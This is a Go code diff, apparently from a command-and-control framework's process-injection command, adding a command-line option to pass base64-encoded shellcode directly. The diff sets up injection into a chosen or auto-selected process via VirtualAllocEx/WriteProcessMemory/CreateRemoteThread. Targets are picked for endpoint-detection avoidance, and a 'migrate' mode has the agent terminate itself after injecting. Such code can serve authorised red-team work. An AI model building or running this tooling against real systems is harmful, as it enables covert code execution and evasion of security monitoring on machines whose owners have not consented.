@@ -43,6 +43,11 @@ func init() {
 						GroupName:           "New File",
 						UIModalPosition:     0,
 					},
+					{
+						ParameterIsRequired: true,
+						GroupName:           "CLI",
+						UIModalPosition:     0,
+					},
 				},
 			},
 			{
@@ -76,8 +81,24 @@ func init() {
 				},
 			},
 			{
+				Name:             "shellcode_b64",
+				ModalDisplayName: "Shellcode (Base64)",
+				CLIName:          "shellcode_b64",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				Description:      "Base64-encoded shellcode (for CLI/API usage)",
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: true,
+						GroupName:           "CLI",
+						UIModalPosition:     1,
+					},
+				},
+			},
+			{
 				Name:                 "pid",
 				ModalDisplayName:     "Target PID",
+				CLIName:              "pid",
 				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
 				Description:          "Process ID to inject into. Leave empty when using target auto-selection.",
 				DynamicQueryFunction: getProcessList,
@@ -93,11 +114,17 @@ func init() {
 						GroupName:           "New File",
 						UIModalPosition:     2,
 					},
+					{
+						ParameterIsRequired: true,
+						GroupName:           "CLI",
+						UIModalPosition:     2,
+					},
 				},
 			},
 			{
 				Name:             "target",
 				ModalDisplayName: "Target Selection",
+				CLIName:          "target",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
 				Description:      "Auto-select injection target. Scores running processes for suitability (EDR avoidance, arch match, integrity level). Overrides PID when set.",
 				DefaultValue:     "",
@@ -111,6 +138,11 @@ func init() {
 					{
 						ParameterIsRequired: false,
 						GroupName:           "New File",
+						UIModalPosition:     4,
+					},
+					{
+						ParameterIsRequired: false,
+						GroupName:           "CLI",
 						UIModalPosition:     4,
 					},
 				},
@@ -188,13 +220,26 @@ func init() {
 				action = "inject"
 			}
 
-			// Resolve file contents by checking actual args (not ParameterGroupName)
-			filename, fileContents, err := resolveFileContents(taskData)
-			if err != nil {
-				response.Success = false
-				response.Error = err.Error()
-				return response
+			// Check for direct base64 shellcode first (CLI/API usage)
+			var shellcodeB64 string
+			var filename string
+			sc, _ := taskData.Args.GetStringArg("shellcode_b64")
+			if sc != "" {
+				shellcodeB64 = sc
+				filename = "(inline)"
+			} else {
+				fname, fileContents, fErr := resolveFileContents(taskData)
+				if fErr != nil {
+					response.Success = false
+					response.Error = fErr.Error()
+					return response
+				}
+				filename = fname
+				shellcodeB64 = base64.StdEncoding.EncodeToString(fileContents)
 			}
+
+			// Decode to get size for display
+			scBytes, _ := base64.StdEncoding.DecodeString(shellcodeB64)
 
 			// Get target selection mode (if any)
 			target, _ := taskData.Args.GetStringArg("target")
@@ -202,7 +247,7 @@ func init() {
 			// Get the target PID (may be 0 if using auto-selection)
 			pid, err := parsePIDFromArg(taskData)
 			if err != nil {
-				pid = 0 // Will use target auto-selection
+				pid = 0
 			}
 
 			if pid <= 0 && target == "" {
@@ -218,25 +263,23 @@ func init() {
 			}
 			var displayParams string
 			if target != "" {
-				displayParams = fmt.Sprintf("Action: %s\nShellcode: %s (%d bytes)\nTarget: %s (auto-select)", actionLabel, filename, len(fileContents), target)
+				displayParams = fmt.Sprintf("Action: %s\nShellcode: %s (%d bytes)\nTarget: %s (auto-select)", actionLabel, filename, len(scBytes), target)
 			} else {
-				displayParams = fmt.Sprintf("Action: %s\nShellcode: %s (%d bytes)\nTarget PID: %d", actionLabel, filename, len(fileContents), pid)
+				displayParams = fmt.Sprintf("Action: %s\nShellcode: %s (%d bytes)\nTarget PID: %d", actionLabel, filename, len(scBytes), pid)
 			}
 			response.DisplayParams = &displayParams
 
-			artifactDesc := fmt.Sprintf("VirtualAllocEx/WriteProcessMemory/CreateRemoteThread into PID %d (%d bytes)", pid, len(fileContents))
+			artifactDesc := fmt.Sprintf("VirtualAllocEx/WriteProcessMemory/CreateRemoteThread into PID %d (%d bytes)", pid, len(scBytes))
 			if target != "" {
-				artifactDesc = fmt.Sprintf("VirtualAllocEx/WriteProcessMemory/CreateRemoteThread with auto-target '%s' (%d bytes)", target, len(fileContents))
+				artifactDesc = fmt.Sprintf("VirtualAllocEx/WriteProcessMemory/CreateRemoteThread with auto-target '%s' (%d bytes)", target, len(scBytes))
 			}
 			if action == "migrate" {
 				artifactDesc += " [MIGRATE: agent will self-terminate after injection]"
 			}
 			createArtifact(taskData.Task.ID, "Process Inject", artifactDesc)
 
-			// Build the actual parameters JSON that will be sent to the agent
-			// Encode shellcode contents as base64 to embed in JSON
 			params := map[string]interface{}{
-				"shellcode_b64": base64.StdEncoding.EncodeToString(fileContents),
+				"shellcode_b64": shellcodeB64,
 				"pid":           pid,
 				"target":        target,
 				"action":        action,
